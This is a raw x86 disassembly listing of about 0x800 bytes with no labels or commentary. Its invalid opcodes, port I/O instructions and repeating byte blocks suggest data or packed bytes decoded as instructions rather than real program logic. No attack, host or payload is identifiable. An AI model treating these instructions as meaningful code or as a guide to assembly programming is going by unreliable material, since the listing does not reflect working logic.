  407e7a:	add    eax,0x434162
  407e7f:	inc    eax
  407e80:	add    BYTE PTR [edx+0x5],ah
  407e83:	inc    eax
  407e84:	adc    BYTE PTR [edx+0x40],ah
  407e87:	inc    ebx
  407e88:	inc    ecx
  407e89:	add    eax,0x4340
  407e8e:	add    eax,0x404162
  407e93:	add    BYTE PTR [eax+0x43],al
  407e96:	inc    eax
  407e97:	add    eax,0x40644dd1
  407e9c:	dec    ecx
  407e9d:	cmp    al,0x40
  407e9f:	and    DWORD PTR [eax-0x5],edx
  407ea2:	cli    
  407ea3:	inc    eax
  407ea4:	push   0x3760404a
  407ea9:	mov    eax,ds:0x616c796
  407eae:	inc    eax
  407eaf:	arpl   WORD PTR [edi+0x4e],ax
  407eb2:	in     eax,dx
  407eb3:	(bad)  
  407eb4:	clc    
  407eb5:	test   al,0x40
  407eb7:	sbb    bl,0xd8
  407eba:	jb     0x407f0b
  407ebc:	bound  edx,QWORD PTR [edx]
  407ebe:	inc    eax
  407ebf:	jecxz  0x407f18
  407ec1:	pop    eax
  407ec2:	dec    di
  407ec4:	dec    ebp
  407ec5:	pop    esp
  407ec6:	inc    eax
  407ec7:	xor    dl,BYTE PTR [edi-0x2a]
  407eca:	xchg   esp,eax
  407ecb:	push   esp
  407ecc:	in     al,dx
  407ecd:	adc    DWORD PTR [eax-0x1f],eax
  407ed0:	out    dx,al
  407ed1:	dec    ecx
  407ed2:	inc    esi
  407ed3:	sub    al,0x40
  407ed5:	add    BYTE PTR [eax],al
  407ed7:	inc    ecx
  407ed8:	inc    ebx
  407ed9:	add    eax,0x41784062
  407ede:	inc    eax
  407edf:	inc    eax
  407ee0:	add    BYTE PTR [edi],cl
  407ee2:	bound  eax,QWORD PTR [ebx+0x0]
  407ee5:	add    eax,0x25006240
  407eea:	inc    eax
  407eeb:	add    eax,0x40254143
  407ef0:	add    eax,0x6c620000
  407ef5:	retf   
  407ef6:	inc    eax
  407ef7:	push   esp
  407ef8:	push   ecx
  407ef9:	call   0x48ac42a7
  407efe:	inc    eax
  407eff:	and    ebx,edx
  407f01:	into   
  407f02:	xchg   edx,eax
  407f03:	mov    edi,0x444045f8
  407f08:	jae    0x407f59
  407f0a:	cwde   
  407f0b:	mov    edi,0x2340f2eb
  407f10:	ins    DWORD PTR es:[edi],dx
  407f11:	inc    eax
  407f12:	mov    ch,0x43
  407f14:	add    BYTE PTR [eax],al
  407f16:	add    BYTE PTR [ecx+0x40],al
  407f19:	bound  esp,QWORD PTR [esi+0x0]
  407f1c:	inc    eax
  407f1d:	add    eax,0x5400000
  407f22:	inc    ecx
  407f23:	inc    eax
  407f24:	inc    eax
  407f25:	bound  esp,QWORD PTR ds:0x25050043
  407f2b:	inc    ecx
  407f2c:	inc    ebx
  407f2d:	inc    eax
  407f2e:	test   BYTE PTR [eax+0x0],al
  407f31:	bound  ebx,QWORD PTR [eax+0x62]
  407f34:	inc    ecx
  407f35:	inc    eax
  407f36:	fisub  DWORD PTR [eax-0x4ce8bfcc]
  407f3c:	mov    ecx,0x5e6d3862
  407f41:	inc    eax
  407f42:	mov    ds:0xa87374bf,al
  407f47:	and    edi,eax
  407f49:	inc    eax
  407f4a:	mov    edi,0x1190387f
  407f4f:	push   0x712740b4
  407f54:	inc    edi
  407f55:	or     eax,0x41406210
  407f5a:	and    eax,0x40000500
  407f5f:	inc    ebx
  407f60:	add    eax,0x40624041
  407f65:	inc    ebx
  407f66:	add    eax,0x43402541
  407f6b:	bound  eax,QWORD PTR [eax+0x43]
  407f6e:	int3   
  407f6f:	inc    eax
  407f70:	bound  eax,QWORD PTR [eax]
  407f72:	inc    ecx
  407f73:	inc    eax
  407f74:	inc    eax
  407f75:	add    eax,0xd54b805
  407f7a:	inc    eax
  407f7b:	push   ebx
  407f7c:	dec    esp
  407f7d:	mov    edx,ebp
  407f7f:	or     eax,0xa140cba9
  407f84:	jnp    0x407f68
  407f86:	mov    bl,0xcd
  407f88:	outs   dx,DWORD PTR ds:[esi]
  407f89:	adc    BYTE PTR [eax+0x49],al
  407f8c:	dec    ebx
  407f8d:	test   al,0x64
  407f8f:	adc    BYTE PTR [ecx],ah
  407f91:	mov    al,ds:0xf8716240
  407f96:	stc    
  407f97:	bound  eax,QWORD PTR [eax+0x25]
  407f9a:	add    BYTE PTR [esi+0x40],ah
  407f9d:	add    eax,0x40404143
  407fa2:	inc    ebx
  407fa3:	add    BYTE PTR [eax],al
  407fa5:	add    BYTE PTR [edx-0x34],ah
  407fa8:	inc    eax
  407fa9:	add    eax,0x40004041
  407fae:	inc    ecx
  407faf:	int3   
  407fb0:	add    BYTE PTR [ebx-0x7c],al
  407fb3:	add    eax,0x5406240
  407fb8:	bound  eax,QWORD PTR [edx+0x66]
  407fbb:	inc    edx
  407fbc:	inc    eax
  407fbd:	das    
  407fbe:	inc    eax
  407fbf:	xchg   esp,eax
  407fc0:	mov    ss,WORD PTR [edx+0x3e]
  407fc3:	adc    al,0x40
  407fc5:	inc    edx
  407fc6:	nop
  407fc7:	jae    0x407fce
  407fc9:	add    al,0xd8
  407fcb:	inc    eax
  407fcc:	inc    eax
  407fcd:	loope  0x407ff5
  407fcf:	inc    eax
  407fd0:	bound  ebx,QWORD PTR [eax+0x41]
  407fd3:	add    eax,0x40404340
  407fd8:	inc    ebx
  407fd9:	inc    eax
  407fda:	test   BYTE PTR [eax],al
  407fdc:	add    eax,0x40624041
  407fe1:	inc    eax
  407fe2:	add    BYTE PTR [edx+0x5],ah
  407fe5:	inc    ebx
  407fe6:	add    BYTE PTR [eax+0x78],al
  407fe9:	inc    ecx
  407fea:	add    BYTE PTR [eax+0x41],bl
  407fed:	(bad)  
  407fee:	(bad)  
  407ff0:	int    0xb5
  407ff2:	fs inc eax
  407ff4:	xor    BYTE PTR [esi],cl
  407ff6:	push   DWORD PTR [ebx+0x40bbfc88]
  407ffc:	daa    
  407ffd:	push   esi
  407ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fff:	fs adc eax,0x36409c62
  408005:	and    esp,ebp
  408007:	clc    
  408008:	inc    ebx
  408009:	xor    dh,BYTE PTR [eax+eax*2-0x5d]
  40800d:	jnp    0x408055
  40800f:	mov    WORD PTR [eax+eiz*1+0x11594064],?
  408016:	not    BYTE PTR ds:0x8440d315
  40801c:	add    ah,cl
  40801e:	bound  eax,QWORD PTR ds:0xcc840f41
  408024:	inc    ebx
  408025:	add    BYTE PTR [eax+0x0],al
  408028:	inc    eax
  408029:	inc    eax
  40802a:	inc    eax
  40802b:	int3   
  40802c:	add    BYTE PTR ds:0x62404341,al
  408032:	pop    eax
  408033:	add    BYTE PTR [ebx+0x40],al
  408036:	bound  ecx,QWORD PTR [edi]
  408038:	inc    eax
  408039:	arpl   WORD PTR [eax+0x21],ax
  40803c:	mov    ch,0xf5
  40803e:	aad    0xcb
  408040:	sub    eax,0x642f4074
  408045:	pop    edi
  408046:	lahf   
  408047:	inc    eax
  408048:	test   al,0xd0
  40804a:	inc    eax
  40804b:	inc    esp
  40804c:	xor    DWORD PTR [ecx],esi
  40804e:	add    BYTE PTR [eax],al
  408050:	inc    eax
  408051:	inc    eax
  408052:	cmovno eax,DWORD PTR ds:0x40056243
  408059:	int3   
  40805a:	add    ah,cl
  40805c:	inc    eax
  40805d:	inc    eax
  40805e:	bound  eax,QWORD PTR [ecx+0x0]
  408061:	add    BYTE PTR [edi],cl
  408063:	inc    ebx
  408064:	inc    eax
  408065:	inc    eax
  408066:	add    BYTE PTR [ecx+0x43],al
  408069:	add    eax,0x40256240
  40806e:	bound  eax,QWORD PTR [eax]
  408070:	fs inc eax
  408072:	mov    ds:0x26214083,al
  408077:	icebp  
  408078:	cli    
  408079:	inc    eax
  40807a:	aas    
  40807b:	ins    DWORD PTR es:[edi],dx
  40807c:	inc    eax
  40807d:	pop    edx
  40807e:	jne    0x408045
  408080:	mov    cl,BYTE PTR [edx-0x5abfcec0]
  408086:	dec    esi
  408087:	leave  
  408088:	in     al,dx
  408089:	les    edi,FWORD PTR [edx+0x48]
  40808c:	inc    eax
  40808d:	adc    DWORD PTR [eax],esi
  40808f:	scas   eax,DWORD PTR es:[edi]
  408090:	xchg   edx,eax
  408091:	dec    edi
  408092:	popf   
  408093:	pop    esi
  408094:	inc    eax
  408095:	popa   
  408096:	add    DWORD PTR [ebp+0x25528866],edx
  40809c:	inc    eax
  40809d:	dec    edi
  40809e:	pop    edx
  40809f:	push   eax
  4080a0:	mov    BYTE PTR ds:0x61402ecb,cl
  4080a6:	jne    0x408112
  4080a8:	hlt    
  4080a9:	leave  
  4080aa:	rol    BYTE PTR ds:0x4140cc00,1
  4080b0:	inc    eax
  4080b1:	inc    ebx
  4080b2:	bound  esp,QWORD PTR ds:0x41400043
  4080b8:	add    BYTE PTR [eax],al
  4080ba:	add    eax,0x43624062
  4080bf:	inc    ecx
  4080c0:	inc    eax
  4080c1:	inc    eax
  4080c2:	inc    eax
  4080c3:	add    eax,0x40624340
  4080c8:	add    eax,0x40664140
  4080cd:	dec    esi
  4080ce:	inc    eax
  4080cf:	inc    eax
  4080d0:	jp     0x4080aa
  4080d2:	in     eax,dx
  4080d3:	mov    al,0xdf
  4080d5:	test   al,0x40
  4080d7:	mov    al,ds:0xd649274
  4080dc:	test   al,0x11
  4080de:	inc    eax
  4080df:	xor    BYTE PTR [esi+0x60],ch
  4080e2:	outs   dx,BYTE PTR ds:[esi]
  4080e3:	inc    ebx
  4080e4:	retf   0x4041
  4080e7:	sub    eax,DWORD PTR [edi-0x4]
  4080ea:	clc    
  4080eb:	lods   al,BYTE PTR ds:[esi]
  4080ec:	xor    BYTE PTR [ecx+0x41b06140],al
  4080f2:	add    al,0xd
  4080f4:	gs ret 
  4080f6:	inc    eax
  4080f7:	dec    edx
  4080f8:	lods   eax,DWORD PTR ds:[esi]
  4080f9:	fwait
  4080fa:	repnz inc ebx
  4080fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080fd:	mov    al,0x40
  4080ff:	mov    eax,ds:0xa88f312d
  408104:	bound  eax,QWORD PTR [ebp+0x43]
  408107:	add    BYTE PTR ds:0x41107840,al
  40810d:	bound  eax,QWORD PTR [eax+0x40]
  408110:	sldt   WORD PTR [eax-0x34]
  408114:	js     0x408178
  408116:	add    eax,0x40664143
  40811b:	inc    ebx
  40811c:	add    BYTE PTR [ecx+0x5],al
  40811f:	js     0x408161
  408121:	bound  eax,QWORD PTR [eax+0x0]
  408124:	inc    eax
  408125:	inc    eax
  408126:	mov    ebx,0xdee4645
  40812b:	jnp    0x408186
  40812d:	inc    eax
  40812e:	dec    eax
  40812f:	repnz mov al,ss:0x40d033cb
  408136:	loope  0x4081a6
  408138:	pushf  
  408139:	add    eax,0x40cd46b0
  40813e:	inc    esi
  40813f:	inc    ebp
  408140:	add    DWORD PTR [edi+0x402b6656],eax
  408146:	loope  0x4080e3
  408148:	shr    BYTE PTR [eax+eax*2],1
  40814b:	adc    ebx,DWORD PTR [ecx+0x40404341]
  408151:	add    eax,0x434162
  408156:	inc    eax
  408157:	add    BYTE PTR [edx+0x5],ah
  40815a:	inc    eax
  40815b:	adc    BYTE PTR [edx+0x40],ah
  40815e:	inc    ebx
  40815f:	inc    ecx
  408160:	add    eax,0x4340
  408165:	add    eax,0x404162
  40816a:	add    BYTE PTR [eax+0x43],al
  40816d:	inc    eax
  40816e:	add    eax,0xf6424340
  408173:	and    al,BYTE PTR [esi+0x66]
  408176:	outs   dx,DWORD PTR ds:[esi]
  408177:	inc    eax
  408178:	and    DWORD PTR [ebx+0x7eace826],esi
  40817e:	dec    edx
  40817f:	inc    eax
  408180:	push   edi
  408181:	inc    ecx
  408182:	ins    DWORD PTR es:[edi],dx
  408183:	jl     0x408169
  408185:	imul   eax,DWORD PTR [eax+eax*2+0x21],0xa8a87d50
  40818d:	test   al,0x86
  40818f:	inc    eax
  408190:	inc    esi
  408191:	xor    eax,DWORD PTR [eax+0x0]
  408194:	add    BYTE PTR [ecx+0x43],al
  408197:	add    eax,0x41784062
  40819c:	inc    eax
  40819d:	inc    eax
  40819e:	add    BYTE PTR [edi],cl
  4081a0:	bound  eax,QWORD PTR [ebx+0x0]
  4081a3:	add    eax,0x25006240
  4081a8:	inc    eax
  4081a9:	add    eax,0x40254143
  4081ae:	add    eax,0x81620000
  4081b3:	add    eax,0x40b00110
  4081b8:	mov    eax,ds:0x94872141
  4081bd:	fwait
  4081be:	adc    eax,0x5d3b5640
  4081c3:	jno    0x408206
  4081c5:	ret    
  4081c6:	retf   
  4081c7:	inc    eax
  4081c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081c9:	sbb    eax,0x104090eb
  4081ce:	inc    eax
  4081cf:	inc    eax
  4081d0:	add    al,0xe1
  4081d2:	sbb    BYTE PTR [esp+ecx*4],ah
  4081d5:	push   edx
  4081d6:	mov    BYTE PTR [eax+0x62],al
  4081d9:	aad    0x28
  4081db:	retf   0xa96a
  4081de:	inc    esi
  4081df:	inc    eax
  4081e0:	das    
  4081e1:	imul   ecx,DWORD PTR [esp+ebp*4],0x4032b804
  4081e8:	mov    esi,0x460551b1
  4081ed:	xchg   edi,eax
  4081ee:	inc    ebx
  4081ef:	add    BYTE PTR [eax],al
  4081f1:	add    BYTE PTR [ecx+0x40],al
  4081f4:	bound  esp,QWORD PTR [esi+0x0]
  4081f7:	inc    eax
  4081f8:	add    eax,0x5400000
  4081fd:	inc    ecx
  4081fe:	inc    eax
  4081ff:	inc    eax
  408200:	bound  esp,QWORD PTR ds:0x25050043
  408206:	inc    ecx
  408207:	inc    ebx
  408208:	inc    eax
  408209:	test   BYTE PTR [eax+0x0],al
  40820c:	bound  ebx,QWORD PTR [eax+0x62]
  40820f:	inc    ecx
  408210:	inc    eax
  408211:	call   0x6fa80f56
  408216:	xchg   ebp,ecx
  408218:	fidiv  WORD PTR [ebx]
  40821a:	inc    eax
  40821b:	loope  0x40822f
  40821d:	das    
  40821e:	inc    ebp
  40821f:	or     BYTE PTR [ebx-0x20],ah
  408222:	inc    eax
  408223:	dec    ebx
  408224:	sub    bh,BYTE PTR [eax+eax*2]
  408227:	aad    0x48
  408229:	bound  eax,QWORD PTR [eax-0x1f]
  40822c:	adc    al,bh
  40822e:	jl     0x4081fd
  408230:	inc    ebp
  408231:	pop    ebp
  408232:	inc    eax
  408233:	add    al,0xf3
  408235:	icebp  
  408236:	xor    al,0x11
  408238:	sbb    DWORD PTR [eax+eax*2+0x624b42e1],ebx
  40823f:	xchg   esp,eax
  408240:	addr16 addr16 inc eax
  408243:	jp     0x4081f9
  408245:	test   eax,0xf06c0da9
  40824a:	inc    eax
  40824b:	mov    al,ds:0x10bc646e
  408250:	bound  eax,QWORD PTR [eax+0x41]
  408253:	and    eax,0x40000500
  408258:	inc    ebx
  408259:	add    eax,0x40624041
  40825e:	inc    ebx
  40825f:	add    eax,0x43402541
  408264:	bound  eax,QWORD PTR [eax+0x43]
  408267:	int3   
  408268:	inc    eax
  408269:	bound  eax,QWORD PTR [eax]
  40826b:	inc    ecx
  40826c:	inc    eax
  40826d:	inc    eax
  40826e:	add    eax,0xa077cd05
  408273:	inc    eax
  408274:	sub    al,0x40
  408276:	xchg   BYTE PTR [ecx],cl
  408278:	inc    esp
  408279:	frstor [eax+eax*2+0x1b]
  40827d:	push   edx
  40827e:	dec    esp
  40827f:	ss inc eax
  408281:	adc    BYTE PTR [eax+eax*2+0x7399ada1],ah
  408288:	cmp    al,dl
  40828a:	test   al,0x40
  40828c:	push   edx
  40828d:	aaa    
  40828e:	repnz pushf 
  408290:	mov    al,0x68
  408292:	dec    ebx
  408293:	inc    eax
  408294:	loope  0x408277
  408296:	pop    ds
  408297:	dec    ecx
  408298:	add    eax,0x2540621c
  40829d:	add    BYTE PTR [esi+0x40],ah
  4082a0:	add    eax,0x40404143
  4082a5:	inc    ebx
  4082a6:	add    BYTE PTR [eax],al
  4082a8:	add    BYTE PTR [edx-0x34],ah
  4082ab:	inc    eax
  4082ac:	add    eax,0x40004041
  4082b1:	inc    ecx
  4082b2:	int3   
  4082b3:	add    BYTE PTR [ebx-0x7c],al
  4082b6:	add    eax,0x5406240
  4082bb:	bound  ebp,QWORD PTR [edx]
  4082bd:	inc    eax
  4082be:	inc    esi
  4082bf:	pop    ds
  4082c0:	inc    ebp
  4082c1:	ja     0xe180d2d7
  4082c7:	or     al,0xc8
  4082c9:	cdq    
  4082ca:	inc    ebp
  4082cb:	bound  eax,QWORD PTR [edx+0x40]
  4082ce:	mov    bh,0x14
  4082d0:	dec    eax
  4082d1:	arpl   WORD PTR [ebx],si
  4082d3:	pop    esp
  4082d4:	cli    
  4082d5:	inc    eax
  4082d6:	adc    eax,0x944f6837
  4082db:	add    ah,bh
  4082dd:	inc    eax
  4082de:	and    DWORD PTR [edi],ecx
  4082e0:	inc    edx
  4082e1:	or     BYTE PTR ds:0x44401653,al
  4082e7:	xchg   edx,eax
  4082e8:	clc    
  4082e9:	fld    QWORD PTR [edi+0x41586240]
  4082ef:	add    eax,0x40404340
  4082f4:	inc    ebx
  4082f5:	inc    eax
  4082f6:	test   BYTE PTR [eax],al
  4082f8:	add    eax,0x40624041
  4082fd:	inc    eax
  4082fe:	add    BYTE PTR [edx+0x5],ah
  408301:	inc    ebx
  408302:	add    BYTE PTR [eax+0x78],al
  408305:	inc    ecx
  408306:	add    BYTE PTR [eax+0x41],bl
  408309:	(bad)  
  40830a:	cli    
  40830b:	mov    eax,0xde22a040
  408310:	push   ebp
  408311:	lods   al,BYTE PTR ds:[esi]
  408312:	xor    al,0x63
  408314:	inc    eax
  408315:	sub    DWORD PTR [ebx],ebp
  408317:	clc    
  408318:	or     BYTE PTR [ecx-0x60],al
  40831b:	arpl   WORD PTR [eax-0x3b],ax
  40831e:	lock std 
  408320:	fld    QWORD PTR [esi+0xd]
  408323:	test   eax,0xe532ad40
  408328:	pop    ebx
  408329:	mov    WORD PTR [ebx-0x58],?
  40832c:	inc    eax
  40832d:	lds    ebp,FWORD PTR [edx]
  40832f:	dec    edi
  408330:	or     BYTE PTR [eax-0x40bf9648],ah
  408336:	inc    eax
  408337:	test   BYTE PTR [eax],al
  408339:	int3   
  40833a:	bound  eax,QWORD PTR ds:0xcc840f41
  408340:	inc    ebx
  408341:	add    BYTE PTR [eax+0x0],al
  408344:	inc    eax
  408345:	inc    eax
  408346:	inc    eax
  408347:	int3   
  408348:	add    BYTE PTR ds:0x62404341,al
  40834e:	pop    eax
  40834f:	add    BYTE PTR [ebx+0x40],al
  408352:	bound  ecx,QWORD PTR [edi]
  408354:	inc    eax
  408355:	push   esi
  408356:	(bad)  
  408357:	fstp   QWORD PTR [eax+0x2f40430d]
  40835d:	xor    edi,edx
  40835f:	sub    DWORD PTR [eax+0x61406242],ebp
  408365:	je     0x40833c
  408367:	mov    WORD PTR [eax],ss
  408369:	jle    0x408367
  40836b:	inc    eax
  40836c:	shl    bl,0xd9
  40836f:	push   ss
  408370:	pushf  
  408371:	loopne 0x408393
  408373:	inc    eax
  408374:	in     al,0x61
  408376:	push   ss
  408377:	js     0x4083bb
  408379:	mov    al,ds:0x324096
  40837e:	add    BYTE PTR [eax+0x40],al
  408381:	cmovno eax,DWORD PTR ds:0x40056243
  408388:	int3   
  408389:	add    ah,cl
  40838b:	inc    eax
  40838c:	inc    eax
  40838d:	bound  eax,QWORD PTR [ecx+0x0]
  408390:	add    BYTE PTR [edi],cl
  408392:	inc    ebx
  408393:	inc    eax
  408394:	inc    eax
  408395:	add    BYTE PTR [ecx+0x43],al
  408398:	add    eax,0x40256240
  40839d:	bound  eax,QWORD PTR [eax]
  40839f:	aad    0xf3
  4083a1:	lods   al,BYTE PTR ds:[esi]
  4083a2:	inc    eax
  4083a3:	adc    BYTE PTR [eax+eax*2+0x45840f9e],0x8c
  4083ab:	test   al,0x16
  4083ad:	inc    eax
  4083ae:	jo     0x4083c5
  4083b0:	arpl   WORD PTR [edi],di
  4083b2:	push   0x10
  4083b4:	push   0x61c42140
  4083b9:	add    eax,0x4140cc00
  4083be:	inc    eax
  4083bf:	inc    ebx
  4083c0:	bound  esp,QWORD PTR ds:0x41400043
  4083c6:	add    BYTE PTR [eax],al
  4083c8:	add    eax,0x43624062
  4083cd:	inc    ecx
  4083ce:	inc    eax
  4083cf:	inc    eax
  4083d0:	inc    eax
  4083d1:	add    eax,0x40624340
  4083d6:	add    eax,0x40664140
  4083db:	cmp    BYTE PTR fs:[eax+0x54f34073],ch
  4083e2:	hlt    
  4083e3:	enter  0x4246,0xde
  4083e7:	inc    eax
  4083e8:	popa   
  4083e9:	das    
  4083ea:	mov    ah,0xc5
  4083ec:	int    0x2
  4083ee:	inc    esi
  4083ef:	inc    eax
  4083f0:	pusha  
  4083f1:	adc    al,0xf5
  4083f3:	call   0x540c728
  4083f8:	inc    eax
  4083f9:	js     0x40840b
  4083fb:	inc    ecx
  4083fc:	bound  eax,QWORD PTR [eax+0x40]
  4083ff:	sldt   WORD PTR [eax-0x34]
  408403:	js     0x408467
  408405:	add    eax,0x40664143
  40840a:	inc    ebx
  40840b:	add    BYTE PTR [ecx+0x5],al
  40840e:	js     0x408450
  408410:	bound  eax,QWORD PTR [eax+0x0]
  408413:	inc    eax
  408414:	in     al,dx
  408415:	fadd   DWORD PTR [eax+0x59]
  408418:	adc    edi,edi
  40841a:	dec    ecx
  40841b:	aad    0x62
  40841d:	imul   eax,DWORD PTR [eax+0x26],0xcdd49042
  408424:	mov    esi,0x32a340b8
  408429:	and    ebp,esi
  40842b:	adc    DWORD PTR [edi-0x44c7bfaf],ebp
  408431:	inc    ecx
  408432:	inc    ebx
  408433:	inc    eax
  408434:	inc    eax
  408435:	add    eax,0x434162
  40843a:	inc    eax
  40843b:	add    BYTE PTR [edx+0x5],ah
  40843e:	inc    eax
  40843f:	adc    BYTE PTR [edx+0x40],ah
  408442:	inc    ebx
  408443:	inc    ecx
  408444:	add    eax,0x4340
  408449:	add    eax,0x404162
  40844e:	add    BYTE PTR [eax+0x43],al
  408451:	inc    eax
  408452:	add    eax,0x669c3c56
  408457:	xchg   ebp,eax
  408458:	inc    eax
  408459:	out    0x4,al
  40845b:	mov    BYTE PTR [edx+0x42],ah
  40845e:	ds and eax,0x97502440
  408464:	rol    DWORD PTR [esi+0x6e],1
  408467:	les    eax,FWORD PTR [eax+0x1d]
  40846a:	mov    bh,0x11
  40846c:	inc    ebp
  40846d:	in     al,dx
  40846e:	mov    esp,0x40614042
  408473:	rcl    BYTE PTR [ebp+0x40f066ac],0x8d
  40847a:	xor    BYTE PTR [ecx],dl
  40847c:	imul   eax,DWORD PTR [esi+0x3d],0x304340db
  408483:	sahf   
  408484:	push   ecx
  408485:	int    0x67
  408487:	test   al,0x40
  408489:	add    BYTE PTR [eax],al
  40848b:	inc    ecx
  40848c:	inc    ebx
  40848d:	add    eax,0x41784062
  408492:	inc    eax
  408493:	inc    eax
  408494:	add    BYTE PTR [edi],cl
  408496:	bound  eax,QWORD PTR [ebx+0x0]
  408499:	add    eax,0x25006240
  40849e:	inc    eax
  40849f:	add    eax,0x40254143
  4084a4:	add    eax,0x40620000
  4084a9:	loop   0x408515
  4084ab:	inc    eax
  4084ac:	lea    eax,[eax-0x35]
  4084af:	adc    al,BYTE PTR [eax+0x60]
  4084b2:	mov    bl,0x7a
  4084b4:	pop    ebp
  4084b5:	pushf  
  4084b6:	mov    esp,0x5c174045
  4084bb:	imul   ax,WORD PTR ds:0x6240fb66,0x9953
  4084c4:	xchg   ecx,eax
  4084c5:	xchg   DWORD PTR [esi],edi
  4084c7:	pop    ecx
  4084c8:	inc    eax
  4084c9:	xor    eax,0xa85d7044
  4084ce:	bound  esp,QWORD PTR [ebp+0xc]
  4084d1:	aas    
  4084d2:	mov    bl,0xec
  4084d4:	cmp    al,0x5
  4084d6:	mov    edi,0x32e34071
  4084db:	jmp    0x408520
  4084dd:	leave  
  4084de:	inc    ebx
  4084df:	add    BYTE PTR [eax],al
  4084e1:	add    BYTE PTR [ecx+0x40],al
  4084e4:	bound  esp,QWORD PTR [esi+0x0]
  4084e7:	inc    eax
  4084e8:	add    eax,0x5400000
  4084ed:	inc    ecx
  4084ee:	inc    eax
  4084ef:	inc    eax
  4084f0:	bound  esp,QWORD PTR ds:0x25050043
  4084f6:	inc    ecx
  4084f7:	inc    ebx
  4084f8:	inc    eax
  4084f9:	test   BYTE PTR [eax+0x0],al
  4084fc:	bound  ebx,QWORD PTR [eax+0x62]
  4084ff:	inc    ecx
  408500:	inc    eax
  408501:	mov    edi,0xf33c1263
  408506:	xchg   ecx,eax
  408507:	test   BYTE PTR [edi+edi*4+0x6d],al
  40850b:	inc    eax
  40850c:	jecxz  0x40853d
  40850e:	jge    0x408578
  408510:	test   BYTE PTR [edx+0x0],bh
  408513:	adc    eax,0x43196f12
  408518:	ret    
  408519:	test   eax,0x91634064
  40851e:	pushf  
  40851f:	cmp    BYTE PTR [edi+0x5a6ef091],bh
  408525:	inc    esi
  408526:	xchg   esi,eax
  408527:	loope  0x4084e8
  408529:	mov    edi,0x712140a8
  40852e:	dec    ebp
  40852f:	mov    edi,0x41406210
  408534:	and    eax,0x40000500
  408539:	inc    ebx
  40853a:	add    eax,0x40624041
  40853f:	inc    ebx
  408540:	add    eax,0x43402541
  408545:	bound  eax,QWORD PTR [eax+0x43]
  408548:	int3   
  408549:	inc    eax
  40854a:	bound  eax,QWORD PTR [eax]
  40854c:	inc    ecx
  40854d:	inc    eax
  40854e:	inc    eax
  40854f:	add    eax,0x7448a105
  408554:	push   cs
  408555:	out    dx,eax
  408556:	push   esi
  408557:	(bad)  
  408558:	mov    edi,0x40f2454c
  40855d:	adc    cl,dl
  40855f:	add    eax,0x6243a8be
  408564:	(bad)  
  408566:	addr16 lahf 
  408568:	call   DWORD PTR [eax]
  40856a:	sub    BYTE PTR [ebp+0x40],dl
  40856d:	ins    BYTE PTR es:[edi],dx
  40856e:	rcr    DWORD PTR [eax+ebp*4],cl
  408571:	mov    al,ds:0x254062
  408576:	inc    ax
  408578:	add    eax,0x40404143
  40857d:	inc    ebx
  40857e:	add    BYTE PTR [eax],al
  408580:	add    BYTE PTR [edx-0x34],ah
  408583:	inc    eax
  408584:	add    eax,0x40004041
  408589:	inc    ecx
  40858a:	int3   
  40858b:	add    BYTE PTR [ebx-0x7c],al
  40858e:	add    eax,0x5406240
  408593:	bound  edx,QWORD PTR [esi+0x34]
  408596:	or     DWORD PTR [ebp+0x1],edx
  408599:	xor    eax,0x71660543
  40859e:	inc    eax
  40859f:	xor    dh,BYTE PTR [ecx+0x72]
  4085a2:	inc    ebp
  4085a3:	retf   
  4085a4:	sub    DWORD PTR [esp+edx*1-0xf678b4e],eax
  4085ab:	dec    edi
  4085ac:	arpl   WORD PTR [edx+0x40],sp
  4085af:	inc    esp
  4085b0:	xchg   ecx,eax
  4085b1:	sub    al,0x17
  4085b3:	xor    al,0x40
  4085b5:	dec    edx
  4085b6:	add    esp,DWORD PTR [eax-0x7f575c38]
  4085bc:	cmp    BYTE PTR [eax+eax*2+0x3],al
  4085c0:	push   ecx
  4085c1:	in     al,dx
  4085c2:	adc    al,ch
  4085c4:	inc    eax
  4085c5:	bound  ebx,QWORD PTR [eax+0x41]
  4085c8:	add    eax,0x40404340
  4085cd:	inc    ebx
  4085ce:	inc    eax
  4085cf:	test   BYTE PTR [eax],al
  4085d1:	add    eax,0x40624041
  4085d6:	inc    eax
  4085d7:	add    BYTE PTR [edx+0x5],ah
  4085da:	inc    ebx
  4085db:	add    BYTE PTR [eax+0x78],al
  4085de:	inc    ecx
  4085df:	add    BYTE PTR [eax+0x41],bl
  4085e2:	bound  ebp,QWORD PTR [ebp-0x7a]
  4085e5:	adc    eax,0x6ffc5f40
  4085ea:	dec    eax
  4085eb:	xor    al,0xa8
  4085ed:	inc    eax
  4085ee:	popa   
  4085ef:	xor    eax,0x4384e3b9
  4085f4:	adc    eax,0xbf4812
  4085f9:	push   esp
  4085fa:	ret    
  4085fb:	fxch   st(3)
  4085fd:	inc    eax
  4085fe:	test   eax,0x40ab9b53
  408603:	jno    0x408645
  408605:	test   BYTE PTR [eax],al
  408607:	int3   
  408608:	bound  eax,QWORD PTR ds:0xcc840f41
  40860e:	inc    ebx
  40860f:	add    BYTE PTR [eax+0x0],al
  408612:	inc    eax
  408613:	inc    eax
  408614:	inc    eax
  408615:	int3   
  408616:	add    BYTE PTR ds:0x62404341,al
  40861c:	pop    eax
  40861d:	add    BYTE PTR [ebx+0x40],al
  408620:	bound  ecx,QWORD PTR [edi]
  408622:	inc    eax
  408623:	push   0xfb37eb14
  408628:	ins    DWORD PTR es:[edi],dx
  408629:	inc    eax
  40862a:	inc    ebx
  40862b:	inc    esp
  40862c:	inc    eax
  40862d:	aaa    
  40862e:	dec    edi
  40862f:	mov    DWORD PTR [esi+0x42],edi
  408632:	cdq    
  408633:	dec    esp
  408634:	adc    ebp,ebx
  408636:	call   DWORD PTR [esi-0x23a2139e]
  40863c:	inc    eax
  40863d:	aaa    
  40863e:	cmp    BYTE PTR [edx],al
  408640:	arpl   WORD PTR [eax-0xf15755],bp
  408646:	cdq    
  408647:	repnz sub BYTE PTR [edx],dl
  40864a:	dec    esp
  40864b:	adc    eax,0xd8533740
  408650:	inc    ebp
  408651:	mov    edi,0xff09c9ce
  408656:	mov    bl,0x2c
  408658:	xchg   DWORD PTR [edi+0x37406455],edi
  40865e:	push   0x75
  408660:	dec    esp
  408661:	add    BYTE PTR [eax],al
  408663:	inc    eax
  408664:	inc    eax
  408665:	cmovno eax,DWORD PTR ds:0x40056243
  40866c:	int3   
  40866d:	add    ah,cl
  40866f:	inc    eax
  408670:	inc    eax
  408671:	bound  eax,QWORD PTR [ecx+0x0]
